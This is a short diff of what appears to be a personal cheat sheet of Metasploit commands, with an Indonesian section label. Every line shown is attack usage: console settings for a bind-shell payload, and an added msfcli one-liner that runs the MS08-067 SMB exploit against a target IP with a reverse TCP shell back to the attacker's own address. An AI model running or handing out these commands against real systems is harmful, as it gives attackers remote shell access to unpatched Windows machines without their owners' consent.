@@ -3,3 +3,6 @@ set RHOST {ip target}
 set payload windows/shell/bind_tcp
 set LPORT 1234
 exploit
+
+======Jika Pakai CLI+================
+msfcli exploit/windows/smb/ms08_067_netapi payload=windows/shell/reverse_tcp RHOST={ip target} LHOST={ip kita} E
